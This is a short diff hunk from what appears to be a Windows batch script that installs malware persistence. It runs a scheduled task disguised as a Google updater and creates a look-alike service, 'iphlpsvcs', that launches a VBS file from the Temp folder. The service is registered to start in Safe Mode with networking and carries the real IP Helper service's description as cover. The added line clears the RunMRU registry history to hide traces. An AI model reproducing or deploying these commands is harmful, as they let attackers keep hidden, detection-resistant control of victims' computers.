@@ -11,3 +11,4 @@ SCHTASKS /RUN /TN "GoogleSystem\GoogleUpdater\ChromeUpdater" >nul 2>&1
 sc.exe create iphlpsvcs binpath= "WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" group= NetworkProvider type= own start= auto error= ignore displayname= "DHCP Config" >nul 2>&1
 cmd /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\iphlpsvcs" /f /t REG_SZ /d "Service" >nul 2>&1
 sc description iphlpsvcs "Provides tunnel connectivity using IPv6 transition technologies (6to4, ISATAP, Port Proxy, and Teredo), and IP-HTTPS. If this service is stopped, the computer will not have the enhanced connectivity benefits that these technologies offer." >nul 2>&1
+reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f >nul 2>&1
